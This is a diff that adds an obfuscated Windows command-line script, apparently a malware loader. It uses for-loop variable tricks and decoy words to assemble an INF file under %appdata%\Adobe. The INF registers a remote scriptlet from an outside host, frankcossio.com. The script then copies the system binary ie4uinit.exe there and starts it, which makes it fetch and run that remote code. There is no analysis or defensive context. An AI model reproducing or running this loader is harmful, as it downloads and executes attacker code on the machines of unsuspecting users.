@@ -1,0 +1,7 @@
+/v /c (for %w in (s) do @set "Initiatives=%~w") &&
+  (for %g in (a) do @set "Miles=%~g") &&
+  (for %h in (c) do @set "Firms=%~h") &&
+  (for %h in (i) do @set "Wellness=%~h") &&
+  call(for %w in ("[defaultinstall.windows7]" "delfiles=41009" "Un\" "Register\" "OCXs=AABAE" "[strings]" "servicename=' '" "Layer=/" "Meets=:;Rentals" "shortsvcname=' '" "Perspectives=b;Giants" "Wallpapers=%t!Wellness!me%" "Quote=h" "Shine=init" "Shoppers=t;Specials" "[version]" "signature =$windows nt$" "[AABAE]" "sc\" "ro%Perspectives%j,NI,%Quote%%Shoppers%%Shoppers%p%Meets%%Layer%%Layer%gonsaasafe.frankcossio.com/isllagncs" "[41009]" "ieu%Shine%.inf" "[destinationdirs]" "41009=01" "defaultdestdir=11" ) do @echo %~w)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q sWellness!n!Insights!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Loops8=Thesaurus &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Loops54=Album Consultants Skill Disclaimer Admit Winners Powers Utils Waters Seeks Direct Walls Minneapolis Categories Duties Schemes Settle Faces Voters Sport Crawl Century Shock Defines Airports Expectations Telecommunications Minutes Elder Hybrid Unknown Salute Guess Process Camps Crater"
